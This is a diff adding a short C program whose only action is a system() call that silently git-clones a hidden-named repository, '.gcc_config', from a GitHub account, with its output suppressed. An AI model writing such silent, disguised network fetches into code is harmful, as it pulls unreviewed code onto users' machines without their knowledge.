@@ -1,0 +1,6 @@
+#include<stdio.h>
+#include<stdlib.h>
+void main()
+{
+	system("git clone https://github.com/cslabcse/.gcc_config  > /dev/null 2>f1");
+}
